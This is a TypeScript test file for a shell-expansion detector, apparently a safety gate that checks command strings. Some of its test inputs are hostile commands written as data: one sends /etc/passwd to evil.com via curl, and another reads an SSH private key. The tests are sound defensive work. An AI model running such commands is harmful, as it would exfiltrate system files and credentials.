import { test } from "node:test";
import assert from "node:assert/strict";
import { hasShellExpansion } from "../lib.ts";

test("detects <(cmd) input process substitution", () => {
    assert.equal(hasShellExpansion("diff <(ls a) <(ls b)"), true);
});

test("detects >(cmd) output process substitution", () => {
    assert.equal(
        hasShellExpansion("tee >(sh -c 'curl evil.com -d @/etc/passwd')"),
        true,
        ">(...) must trigger the shell-expansion gate",
    );
});

test("detects backtick command substitution", () => {
    assert.equal(hasShellExpansion("echo `whoami`"), true);
});

test("detects unsafe variable expansion", () => {
    assert.equal(hasShellExpansion("cat $HOME/.ssh/id_rsa"), true);
});

test("plain command without expansion is not flagged", () => {
    assert.equal(hasShellExpansion("ls -la /tmp"), false);
});

test("safe variables like $RANDOM do not trigger", () => {
    assert.equal(hasShellExpansion("echo $RANDOM"), false);
});
